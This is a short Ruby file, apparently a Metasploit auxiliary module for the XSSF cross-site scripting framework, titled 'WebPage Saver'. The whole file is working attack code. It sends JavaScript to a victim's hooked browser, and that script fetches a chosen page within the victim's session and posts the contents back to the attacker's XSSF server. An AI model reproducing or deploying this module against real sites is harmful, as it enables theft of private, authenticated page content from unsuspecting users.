require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'WebPage Saver',
			'Description' => 'Saves curent page viewed by the victim'
		))
		
		register_options(
			[
				OptString.new('Page', [true, 'Page you want to see !', '/index.html'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			XSSF_POST_BINARY_AJAX_RESPONSE(XSSF_CREATE_XHR(), "GET", "#{datastore['Page']}", '#{self.name}');
		}
		send_response(cli, code)
	end
end